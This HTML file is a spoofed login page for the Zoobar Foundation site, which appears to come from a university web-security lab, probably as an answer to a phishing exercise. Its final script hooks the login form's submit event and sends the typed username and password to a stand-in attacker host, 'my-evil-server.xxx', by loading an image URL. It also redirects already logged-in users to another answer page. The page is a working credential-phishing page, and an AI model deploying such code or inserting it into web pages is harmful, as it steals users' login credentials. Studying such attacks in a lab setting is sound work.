<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
    <title>
      Login - Zoobar Foundation
    </title>
</head>
<body>
    <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Disciplined
                    Research</a></h1>
    <h2>Supporting the loyal
        soldiers of the United States</h2>
    <div id="login" class="centerpiece">
        <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
            <table>
                <tr>
                  <td>Username:</td>
                  <td><input type="text" name="login_username" size="20"
                  autocomplete="no" value=""></td>
                </tr>
                <tr>
                  <td>Password:</td>
                  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
                  <input type="submit" name="submit_login" value="Log in">
                  <input type="submit" name="submit_registration" value="Register"></td>
                </tr>
            </table>
            <input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
        </form>
    </div>
    <div class="footer warning">
    </div>
    <script>
        document.loginform.login_username.focus();
        var myZoobars = undefined
    </script>
</body>
<script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
<script>
    if (myZoobars != undefined) {
      window.location.href = 'answer-2.html'
    }
    document.forms['loginform'].onsubmit = function(event) {
      new Image().src = 'http://my-evil-server.xxx/?username=' + event.target.login_username.value + '&password=' + event.target.login_password.value
      return true
    }
</script>
</html>
